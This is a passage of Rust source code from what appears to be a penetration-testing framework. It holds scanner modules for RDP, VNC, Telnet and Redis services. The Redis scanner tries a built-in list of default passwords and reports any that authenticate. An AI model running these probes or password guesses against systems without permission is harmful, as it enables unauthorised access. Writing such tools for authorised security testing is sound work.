    if data[0] != 0x02 && data[0] != 0x03 {
        return None;
    }
    let r#type = data[0];
    let _flags = data[1];
    let len = u16::from_le_bytes([data[2], data[3]]);
    if len < 8 {
        return None;
    }
    let selected = u32::from_le_bytes([data[4], data[5], data[6], data[7]]);
    Some((r#type, selected))
}

const PROTOCOL_RDP: u32 = 0x01;
const PROTOCOL_SSL: u32 = 0x02;
const PROTOCOL_NLA: u32 = 0x08;

#[module(
    name = "rdp_scanner",
    kind = "Scanner",
    description = "RDP service scanner  -  version detection and NLA/SSL mode check",
    author = "ICEBOX"
)]
pub struct RdpScanner {
    #[option(required = true, help = "Target IP or hostname")]
    pub host: String,
    #[option(help = "RDP port (default 3389)")]
    pub port: u16,
    #[option(help = "Timeout in milliseconds (default 5000)")]
    pub timeout_ms: u64,
}

#[async_trait]
impl Module for RdpScanner {
    fn options_json(&self) -> serde_json::Value {
        serde_json::to_value(&RdpScannerOptions {
            host: self.host.clone(),
            port: self.port,
            timeout_ms: self.timeout_ms,
        })
        .unwrap_or(serde_json::Value::Null)
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<(), ModuleError> {
        let mut o = RdpScannerOptions {
            host: self.host.clone(),
            port: self.port,
            timeout_ms: self.timeout_ms,
        };
        o.set(name, value)?;
        self.host = o.host;
        self.port = o.port;
        self.timeout_ms = o.timeout_ms;
        Ok(())
    }

    fn validate(&self) -> Result<(), ModuleError> {
        RdpScannerOptions {
            host: self.host.clone(),
            port: self.port,
            timeout_ms: self.timeout_ms,
        }
        .validate()
    }

    async fn run(&self) -> Result<ModuleResult, ModuleError> {
        let port = if self.port > 0 { self.port } else { 3389 };
        let timeout_ms = if self.timeout_ms > 0 {
            self.timeout_ms
        } else {
            5000
        };
        let timeout = std::time::Duration::from_millis(timeout_ms);
        let addr = crate::core::proxy::resolve_dial(&self.host, port);

        let stream =
            match tokio::time::timeout(timeout, tokio::net::TcpStream::connect(&addr)).await {
                Ok(Ok(s)) => s,
                Ok(Err(e)) => return Err(ModuleError::Other(format!("connection failed: {e}"))),
                Err(_) => return Err(ModuleError::Other("connection timed out".into())),
            };

        let req = rdp_build_neg_req(PROTOCOL_RDP | PROTOCOL_SSL | PROTOCOL_NLA);
        if tokio::time::timeout(timeout, stream.writable())
            .await
            .is_err()
        {
            return Err(ModuleError::Other("write timeout".into()));
        }
        let _ = stream.try_write(&req);

        let mut buf = vec![0u8; 1024];
        let n = match tokio::time::timeout(timeout, stream.readable()).await {
            Ok(Ok(_)) => stream.try_read(&mut buf).unwrap_or(0),
            _ => 0,
        };

        if n < 8 {
            return Ok(ModuleResult {
                success: true,
                finding: Some(format!("RDP on tcp/{port}: no response")),
                data: serde_json::json!({"host": self.host, "port": port}),
                ..Default::default()
            });
        }

        let (rsp_type, selected) = rdp_parse_neg_rsp(&buf[..n]).unwrap_or((0, 0));

        let proto_name = match selected {
            1 => "RDP (standard)",
            2 => "SSL/TLS",
            8 => "NLA (CredSSP)",
            0 => "FAILED",
            _ => "unknown",
        };

        let finding = format!(
            "RDP on tcp/{port}: selected={proto_name} (0x{selected:x}), type=0x{rsp_type:x}"
        );

        Ok(ModuleResult {
            success: true,
            finding: Some(finding),
            evidence: vec![format!("rdp/protocol:{proto_name}")],
            data: serde_json::json!({
                "host": self.host, "port": port,
                "selected_protocol": selected,
                "protocol_name": proto_name,
                "response_type": rsp_type,
            }),
            ..Default::default()
        })
    }
}

#[module(
    name = "vnc_scanner",
    kind = "Scanner",
    description = "VNC service scanner  -  protocol version and authentication type detection",
    author = "ICEBOX"
)]
pub struct VncScanner {
    #[option(required = true, help = "Target IP or hostname")]
    pub host: String,
    #[option(help = "VNC port (default 5900)")]
    pub port: u16,
    #[option(help = "Timeout in milliseconds (default 5000)")]
    pub timeout_ms: u64,
    #[option(help = "Check VNC authentication support (default true)")]
    pub check_vnc_auth: bool,
}

#[async_trait]
impl Module for VncScanner {
    fn options_json(&self) -> serde_json::Value {
        serde_json::to_value(&VncScannerOptions {
            host: self.host.clone(),
            port: self.port,
            timeout_ms: self.timeout_ms,
            check_vnc_auth: self.check_vnc_auth,
        })
        .unwrap_or(serde_json::Value::Null)
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<(), ModuleError> {
        let mut o = VncScannerOptions {
            host: self.host.clone(),
            port: self.port,
            timeout_ms: self.timeout_ms,
            check_vnc_auth: self.check_vnc_auth,
        };
        o.set(name, value)?;
        self.host = o.host;
        self.port = o.port;
        self.timeout_ms = o.timeout_ms;
        self.check_vnc_auth = o.check_vnc_auth;
        Ok(())
    }

    fn validate(&self) -> Result<(), ModuleError> {
        VncScannerOptions {
            host: self.host.clone(),
            port: self.port,
            timeout_ms: self.timeout_ms,
            check_vnc_auth: self.check_vnc_auth,
        }
        .validate()
    }

    async fn run(&self) -> Result<ModuleResult, ModuleError> {
        let port = if self.port > 0 { self.port } else { 5900 };
        let timeout_ms = if self.timeout_ms > 0 {
            self.timeout_ms
        } else {
            5000
        };
        let timeout = std::time::Duration::from_millis(timeout_ms);
        let addr = crate::core::proxy::resolve_dial(&self.host, port);

        let stream =
            match tokio::time::timeout(timeout, tokio::net::TcpStream::connect(&addr)).await {
                Ok(Ok(s)) => s,
                Ok(Err(e)) => return Err(ModuleError::Other(format!("connection failed: {e}"))),
                Err(_) => return Err(ModuleError::Other("connection timed out".into())),
            };

        let mut buf = vec![0u8; 4096];
        let n = match tokio::time::timeout(timeout, stream.readable()).await {
            Ok(Ok(_)) => stream.try_read(&mut buf).unwrap_or(0),
            _ => 0,
        };
        if n == 0 {
            return Ok(ModuleResult {
                success: true,
                finding: Some(format!("VNC on tcp/{port}: no protocol version received")),
                data: serde_json::json!({"host": self.host, "port": port}),
                ..Default::default()
            });
        }

        let raw = String::from_utf8_lossy(&buf[..n.min(256)]);
        let banner = raw.lines().next().unwrap_or("").trim().to_string();

        let mut findings = Vec::new();
        let mut evidence = Vec::new();

        if banner.starts_with("RFB") {
            findings.push(format!("version: {banner}"));
            evidence.push(format!("vnc/version:{banner}"));

            let ver_str = if banner == "RFB 003.008\n" || banner == "RFB 003.008" {
                "RFB 003.008\n"
            } else {
                "RFB 003.003\n"
            };
            if tokio::time::timeout(timeout, stream.writable())
                .await
                .is_ok()
            {
                let _ = stream.try_write(ver_str.as_bytes());
            }

            let n2 = match tokio::time::timeout(timeout, stream.readable()).await {
                Ok(Ok(_)) => stream.try_read(&mut buf).unwrap_or(0),
                _ => 0,
            };
            if n2 >= 1 {
                let sec_count = buf[0] as usize;
                if sec_count > 0 && n2 > sec_count {
                    let types: Vec<u8> = buf[1..1 + sec_count].to_vec();
                    let type_names: Vec<String> = types
                        .iter()
                        .map(|&t| match t {
                            1 => "None".into(),
                            2 => "VNC Auth".into(),
                            5 => "RA2".into(),
                            6 => "RA2ne".into(),
                            16 => "Tight".into(),
                            17 => "Ultra".into(),
                            18 => "TLS".into(),
                            19 => "VeNCrypt".into(),
                            20 => "GTK-VNC SASL".into(),
                            21 => "MD5".into(),
                            22 => "Colin 64".into(),
                            _ => format!("Unknown(0x{t:x})"),
                        })
                        .collect();
                    findings.push(format!("auth types: {}", type_names.join(", ")));
                    evidence.extend(types.iter().map(|&t| format!("vnc/auth:0x{t:x}")));
                    if types.contains(&1) {
                        findings.push("No authentication required!".into());
                        evidence.push("vnc/no_auth".into());
                    }
                } else if sec_count == 0 && n2 >= 4 {
                    let auth_type = u32::from_le_bytes([buf[1], buf[2], buf[3], buf[4]]);
                    let name = match auth_type {
                        1 => "None",
                        2 => "VNC Auth",
                        _ => "unknown",
                    };
                    findings.push(format!("auth: {name} (0x{auth_type:x})"));
                    evidence.push(format!("vnc/auth:0x{auth_type:x}"));
                }
            }
        } else {
            findings.push(format!("unrecognized banner: {banner}"));
            evidence.push(format!("vnc/banner:{}", hex_encode(&buf[..n.min(64)])));
        }

        Ok(ModuleResult {
            success: true,
            finding: Some(format!("VNC on tcp/{port}: {}", findings.join("; "))),
            evidence,
            data: serde_json::json!({
                "host": self.host, "port": port,
                "banner": banner,
                "findings": findings,
            }),
            ..Default::default()
        })
    }
}

const IAC: u8 = 0xFF;
const TN_SB: u8 = 0xFA;
const TN_SE: u8 = 0xF0;

fn strip_telnet_negotiation(data: &[u8]) -> Vec<u8> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < data.len() {
        if data[i] == IAC && i + 2 < data.len() {
            match data[i + 1] {
                TN_SB => {
                    let mut j = i + 2;
                    while j + 1 < data.len() {
                        if data[j] == IAC && data[j + 1] == TN_SE {
                            i = j + 2;
                            break;
                        }
                        j += 1;
                    }
                    if j + 1 >= data.len() {
                        i = data.len();
                    }
                }
                _ => {
                    i += 3;
                }
            }
        } else if data[i] >= 32 || data[i] == b'\n' || data[i] == b'\r' || data[i] == b'\t' {
            out.push(data[i]);
            i += 1;
        } else {
            i += 1;
        }
    }
    out
}

#[module(
    name = "telnet_scanner",
    kind = "Scanner",
    description = "Telnet service scanner  -  banner grabbing and option negotiation detection",
    author = "ICEBOX"
)]
pub struct TelnetScanner {
    #[option(required = true, help = "Target IP or hostname")]
    pub host: String,
    #[option(help = "Telnet port (default 23)")]
    pub port: u16,
    #[option(help = "Timeout in milliseconds (default 5000)")]
    pub timeout_ms: u64,
}

#[async_trait]
impl Module for TelnetScanner {
    fn options_json(&self) -> serde_json::Value {
        serde_json::to_value(&TelnetScannerOptions {
            host: self.host.clone(),
            port: self.port,
            timeout_ms: self.timeout_ms,
        })
        .unwrap_or(serde_json::Value::Null)
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<(), ModuleError> {
        let mut o = TelnetScannerOptions {
            host: self.host.clone(),
            port: self.port,
            timeout_ms: self.timeout_ms,
        };
        o.set(name, value)?;
        self.host = o.host;
        self.port = o.port;
        self.timeout_ms = o.timeout_ms;
        Ok(())
    }

    fn validate(&self) -> Result<(), ModuleError> {
        TelnetScannerOptions {
            host: self.host.clone(),
            port: self.port,
            timeout_ms: self.timeout_ms,
        }
        .validate()
    }

    async fn run(&self) -> Result<ModuleResult, ModuleError> {
        let port = if self.port > 0 { self.port } else { 23 };
        let timeout_ms = if self.timeout_ms > 0 {
            self.timeout_ms
        } else {
            5000
        };
        let timeout = std::time::Duration::from_millis(timeout_ms);
        let addr = crate::core::proxy::resolve_dial(&self.host, port);

        let stream =
            match tokio::time::timeout(timeout, tokio::net::TcpStream::connect(&addr)).await {
                Ok(Ok(s)) => s,
                Ok(Err(e)) => return Err(ModuleError::Other(format!("connection failed: {e}"))),
                Err(_) => return Err(ModuleError::Other("connection timed out".into())),
            };

        let mut all_data = Vec::new();
        let mut buf = vec![0u8; 8192];
        loop {
            let n = match tokio::time::timeout(timeout, stream.readable()).await {
                Ok(Ok(_)) => match stream.try_read(&mut buf) {
                    Ok(n) => n,
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => 0,
                    Err(_) => break,
                },
                _ => break,
            };
            if n == 0 {
                break;
            }
            all_data.extend_from_slice(&buf[..n]);
            if all_data.len() > 65536 {
                break;
            }
        }

        if all_data.is_empty() {
            return Ok(ModuleResult {
                success: true,
                finding: Some(format!("Telnet on tcp/{port}: no banner received")),
                data: serde_json::json!({"host": self.host, "port": port}),
                ..Default::default()
            });
        }

        let text = strip_telnet_negotiation(&all_data);
        let clean_text = String::from_utf8_lossy(&text).to_string();

        let banner = clean_text
            .lines()
            .find(|l| !l.trim().is_empty())
            .unwrap_or("")
            .trim()
            .to_string();

        let os_hint = if banner.contains("Linux")
            || banner.contains("ubuntu")
            || banner.contains("debian")
            || banner.contains("centos")
        {
            Some("Linux")
        } else if banner.contains("FreeBSD")
            || banner.contains("NetBSD")
            || banner.contains("OpenBSD")
        {
            Some("BSD")
        } else if banner.contains("SunOS") || banner.contains("Solaris") {
            Some("Solaris")
        } else if banner.contains("AIX") {
            Some("AIX")
        } else if banner.contains("HP-UX") {
            Some("HP-UX")
        } else if banner.to_lowercase().contains("cisco") || banner.to_lowercase().contains("ios") {
            Some("Cisco IOS")
        } else {
            None
        };

        let mut evidence = vec![format!("telnet/banner:{banner}")];
        if let Some(os) = os_hint {
            evidence.push(format!("telnet/os:{os}"));
        }

        Ok(ModuleResult {
            success: true,
            finding: Some(format!(
                "Telnet on tcp/{port}: {banner}{}",
                os_hint.map(|o| format!(" [{o}]")).unwrap_or_default()
            )),
            evidence,
            data: serde_json::json!({
                "host": self.host, "port": port,
                "banner": banner,
                "os_hint": os_hint,
                "raw_length": all_data.len(),
                "negotiation_count": all_data.iter().filter(|&&b| b == IAC).count(),
            }),
            ..Default::default()
        })
    }
}

const REDIS_DEFAULT_PASSWORDS: &[&str] =
    &["", "redis", "default", "redislabs", "admin", "password"];

#[module(
    name = "redis_scanner",
    kind = "Scanner",
    description = "Redis service scanner  -  version detection and unprotected instance check",
    author = "ICEBOX"
)]
pub struct RedisScanner {
    #[option(required = true, help = "Target IP or hostname")]
    pub host: String,
    #[option(help = "Redis port (default 6379)")]
    pub port: u16,
    #[option(help = "Timeout in milliseconds (default 5000)")]
    pub timeout_ms: u64,
    #[option(help = "Check default passwords when auth is required (default true)")]
    pub check_defaults: bool,
}

async fn redis_read_line(
    stream: &tokio::net::TcpStream,
    timeout: std::time::Duration,
) -> Result<String, ModuleError> {
    let mut buf = vec![0u8; 4096];
    let n = match tokio::time::timeout(timeout, stream.readable()).await {
        Ok(Ok(_)) => stream.try_read(&mut buf).unwrap_or(0),
        _ => return Err(ModuleError::Other("read timeout".into())),
    };
    let text = String::from_utf8_lossy(&buf[..n.min(4092)]);
    let line = text.lines().next().unwrap_or("").trim().to_string();
    Ok(line)
}

async fn redis_send(
    stream: &tokio::net::TcpStream,
    cmd: &[u8],
    timeout: std::time::Duration,
) -> Result<(), ModuleError> {
    match tokio::time::timeout(timeout, stream.writable()).await {
        Ok(Ok(_)) => stream
            .try_write(cmd)
            .map_err(|e| ModuleError::Other(format!("write: {e}")))
            .map(|_| ()),
        _ => Err(ModuleError::Other("write timeout".into())),
    }
}

#[async_trait]
impl Module for RedisScanner {
    fn options_json(&self) -> serde_json::Value {
        serde_json::to_value(&RedisScannerOptions {
            host: self.host.clone(),
            port: self.port,
            timeout_ms: self.timeout_ms,
            check_defaults: self.check_defaults,
        })
        .unwrap_or(serde_json::Value::Null)
    }

    fn set_option(&mut self, name: &str, value: &str) -> Result<(), ModuleError> {
        let mut o = RedisScannerOptions {
            host: self.host.clone(),
            port: self.port,
            timeout_ms: self.timeout_ms,
            check_defaults: self.check_defaults,
        };
        o.set(name, value)?;
        self.host = o.host;
        self.port = o.port;
        self.timeout_ms = o.timeout_ms;
        self.check_defaults = o.check_defaults;
        Ok(())
    }

    fn validate(&self) -> Result<(), ModuleError> {
        RedisScannerOptions {
            host: self.host.clone(),
            port: self.port,
            timeout_ms: self.timeout_ms,
            check_defaults: self.check_defaults,
        }
        .validate()
    }

    async fn run(&self) -> Result<ModuleResult, ModuleError> {
        let port = if self.port > 0 { self.port } else { 6379 };
        let timeout_ms = if self.timeout_ms > 0 {
            self.timeout_ms
        } else {
            5000
        };
        let timeout = std::time::Duration::from_millis(timeout_ms);
        let addr = crate::core::proxy::resolve_dial(&self.host, port);

        let stream =
            match tokio::time::timeout(timeout, tokio::net::TcpStream::connect(&addr)).await {
                Ok(Ok(s)) => s,
                Ok(Err(e)) => return Err(ModuleError::Other(format!("connection failed: {e}"))),
                Err(_) => return Err(ModuleError::Other("connection timed out".into())),
            };

        redis_send(&stream, b"PING\r\n", timeout).await?;
        let pong = redis_read_line(&stream, timeout).await.unwrap_or_default();

        let mut findings = Vec::new();
        let mut evidence = Vec::new();
        let mut authed = false;
        let mut used_password = String::new();

        if pong == "+PONG" {
            findings.push("no authentication required".into());
            evidence.push("redis/no_auth".into());
            authed = true;
        } else if pong.starts_with("-NOAUTH") {
            findings.push("authentication required".into());
            if self.check_defaults {
                for pass in REDIS_DEFAULT_PASSWORDS {
                    let auth_cmd = format!("AUTH {pass}\r\n");
                    redis_send(&stream, auth_cmd.as_bytes(), timeout).await.ok();
                    let resp = redis_read_line(&stream, timeout).await.unwrap_or_default();
                    if resp == "+OK" {
                        findings.push(format!("AUTH success with password: {:?}", pass));
                        evidence.push(format!("redis/cred::{:?}", pass));
                        authed = true;
                        used_password = pass.to_string();
                        break;
                    }
                }
                if !authed {
                    findings.push("default passwords failed".into());
                }
            }
        } else {
            findings.push(format!("unexpected response: {pong}"));
        }

        if authed {
            redis_send(&stream, b"INFO\r\n", timeout).await.ok();
            let mut all_data = Vec::new();
            let mut buf = vec![0u8; 16384];
            let n = match tokio::time::timeout(timeout, stream.readable()).await {
                Ok(Ok(_)) => stream.try_read(&mut buf).unwrap_or(0),
                _ => 0,
            };
            if n > 0 {
                all_data.extend_from_slice(&buf[..n]);
                let info_text = String::from_utf8_lossy(&all_data);

                let mut version = String::new();
                let mut os = String::new();
                for line in info_text.lines() {
                    if let Some(v) = line.strip_prefix("redis_version:") {
                        version = v.trim().to_string();
                    }
                    if let Some(o) = line.strip_prefix("os:") {
                        os = o.trim().to_string();
                    }
                }
                if !version.is_empty() {
                    findings.push(format!("version: {version}"));
                    evidence.push(format!("redis/version:{version}"));
                }
                if !os.is_empty() {
                    evidence.push(format!("redis/os:{os}"));
                }
            }
        }

        Ok(ModuleResult {
            success: true,
            finding: Some(format!("Redis on tcp/{port}: {}", findings.join("; "))),
            evidence,
            data: serde_json::json!({
                "host": self.host, "port": port,
                "authenticated": authed,
                "used_password": used_password,
                "findings": findings,
            }),
            ..Default::default()
        })
    }
}
